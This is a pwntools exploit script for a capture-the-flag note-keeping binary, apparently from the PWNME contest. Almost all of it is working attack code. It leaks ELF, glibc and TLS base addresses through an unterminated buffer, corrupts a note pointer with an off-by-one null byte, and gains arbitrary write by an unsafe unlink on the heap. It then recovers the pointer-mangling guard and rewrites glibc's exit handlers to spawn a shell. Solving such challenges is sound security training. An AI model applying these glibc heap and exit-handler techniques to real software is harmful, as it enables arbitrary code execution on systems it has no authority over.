from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./compresse_patched', '''
    b *(menu+435)
    b *(menu+652)
    b *(menu+673)
    b *(menu+698)
    b *(menu+719)
    b *(menu+729)
    b *(menu+919)
    continue
''')

def flate_string(content):
    p.sendlineafter(b"choice:", b'1')
    p.sendlineafter(b"flate:", content)

def new_note(content):
    p.sendlineafter(b"choice:", b'3')
    p.sendlineafter(b"note:", content)

def edit_note(content):
    p.sendlineafter(b"choice:", b'4')
    p.sendlineafter(b"note:", content)

def delete_note():
    p.sendlineafter(b"choice:", b'5')

def print_note():
    p.sendlineafter(b"choice:", b'6')

def select_note(idx):
    p.sendlineafter(b"choice:", b'7')
    p.sendlineafter(b"select:", str(idx).encode())

def exit_note():
    p.sendlineafter(b"choice:", b'8')

def pointer_guard_encrypt(decrypted: int, pointer_guard: int):
    r_bits = 0x11
    max_bits = 64
    encrypted = ((decrypted^pointer_guard)<<(r_bits%max_bits))&(2**max_bits-1)|(((decrypted^pointer_guard)&(2**max_bits-1))>>(max_bits-(r_bits%max_bits)))
    return encrypted

def calculate_pointer_guard(encrypted: int, decrypted: int):
    r_bits = 0x11
    max_bits = 64
    pointer_guard = (((encrypted&(2**max_bits-1))>>r_bits%max_bits)|(encrypted<<(max_bits-(r_bits%max_bits))&(2**max_bits-1)))^decrypted
    return pointer_guard

# flate_string function follows logic:
# 1. it has two arguments, first is input string (rdi), second is output string (rsi), both of which are on stack
# 2. it flates deflated string with multiple "number<char>" (for input string "1a2b3c", it outputs "abbccc")
# 3. it first retrieve number, then output char with number times after validating number is not larger than 512 bytes, repeatedly, and set null terminator finally
# 4. if number is larger than 512 (0x200) bytes, function will not process this and following "number<char>", and not set null terminator, and directly return

# Stage 1: leak elf base address, glibc base address, and tls base address
# 1st qword of output string has a fixed offset from elf base address
flate_string(b'10000a')
p.recvuntil(b"Flated: ")
elf_base_addr = u64(p.recvline().strip().ljust(8, b"\x00"))-0x21d8
log.info(f"elf base address: {hex(elf_base_addr)}")
# 4th qword of output string has a fixed offset from glibc base address
flate_string(b'24a10000b')
p.recvuntil(b"a"*24)
glibc_base_addr = u64(p.recvline().strip().ljust(8, b"\x00"))-0xad7e2
log.info(f"glibc base address: {hex(glibc_base_addr)}")
# tls base address has a fixed offset from glibc base address
tls_base_addr = glibc_base_addr-0x28c0
log.info(f"tls base address: {hex(tls_base_addr)}")

# Stage 2: unsafe unlink to get arbitrary write
# create three notes for following operations
new_note(b'A')
new_note(b'B')
new_note(b'C')
# prepare fake chunk for unsafe unlink in first note: first note is at heap_base_addr+0x6b0, and fake chunk of size 0x411 is at heap_base_addr+0x6c0
# elf_base_addr+0x4040-0x18 (&notes[0]-0x18) is fd pointer of fake chunk, which satisfies the condition: fake chunk->fd->bk == fake chunk
# elf_base_addr+0x4040-0x10 (&notes[0]-0x10) is bk pointer of fake chunk, which satisfies the condition: fake chunk->bk->fd == fake chunk
select_note(0)
edit_note(p64(0)+p64(0x411)+p64(elf_base_addr+0x4040-0x18)+p64(elf_base_addr+0x4040-0x10)+p64(0)+p64(0))
# modify prev_size and size of second note to pass check of unsafe unlink
# output string buffer for flate_string function is at $rbp-0x220 on stack, and current note pointer (which is second note at heap_base_addr+0xad0 now) is at $rbp-0x20 on stack
# use flate_string function to fill output string buffer on stack with 512 (0x200) bytes to overflow LSB of current note pointer on stack with null byte "\x00", making current note pointer on stack is heap_base_addr+0xa00, after 0xc0 bytes reaching prev_size and size of second note at heap_base_addr+0xad0
# overwrite prev_size and size of second note with 0x410 (fake chunk size) and 0x420 (set prev_inuse to 0) respectively
select_note(1)
flate_string(b'512a')
edit_note(b'\x00'*0xc0+p64(0x410)+p64(0x420))
# delete second note to trigger unsafe unlink
# a chunk of size 0x830 (0x410+0x420) starting from fake chunk at heap_base_addr+0x6c0 is freed into unsorted bin
# fake chunk->bk->fd (&notes[0]) is set to fake chunk->fd (&notes[0]-0x18)
select_note(1)
delete_note()
# value in notes[0] is &notes[0]-0x18 now
# make value in notes[0] be address of the first note &notes[0]
# make value in notes[1] be address of __exit_funcs+24 (initial+24) in glibc, which can be specified by p initial in GDB (https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/exit.h)
# also make note_count be greater than or equal to 2 for program logic
select_note(0)
edit_note(p64(0)+p64(0)+p64(0)+p64(elf_base_addr+0x4040)+p64(glibc_base_addr+0x204fd8)+p64(0)+p64(0)+p64(2)+p64(0))

# Stage 3: abuse exit handlers and bypass pointer mangle to pop a shell (https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc)/(https://ctftime.org/writeup/34804)
# value in notes[1] is address of encrypted exit function (_dl_fini) that will be called by __run_exit_handlers later, which can be specified by setting a breakpoint at __run_exit_handlers+356 in GDB
# assembly instruction at __run_exit_handlers+356 is "call rax", and value in rax is decrypted address of exit function (_dl_fini)
# retrieve current value at address of encrypted exit function (_dl_fini), whose decrypted value is address of exit function (_dl_fini), and then calculate pointer guard
select_note(1)
print_note()
p.recvuntil(b"note : ")
encrypted_dl_fini_addr = u64(p.recvline().strip().ljust(8, b"\x00"))
dl_fini_addr = tls_base_addr+0x21bc40
pointer_guard_val = calculate_pointer_guard(encrypted_dl_fini_addr, dl_fini_addr)
log.info(f"pointer guard value: {hex(pointer_guard_val)}")
# overwrite address of encrypted exit function (_dl_fini) with encrypted address of system (will be at __exit_funcs+24) and address of "/bin/sh\x00" string in glibc (will be at __exit_funcs+32)
glibc_e = ELF('./libc.so.6')
edit_note(p64(pointer_guard_encrypt(glibc_base_addr+glibc_e.sym.system, pointer_guard_val))+p64(glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00')))) # b *__run_exit_handlers+356
# trigger exit function to pop a shell
exit_note()

p.interactive()

# PWNME{}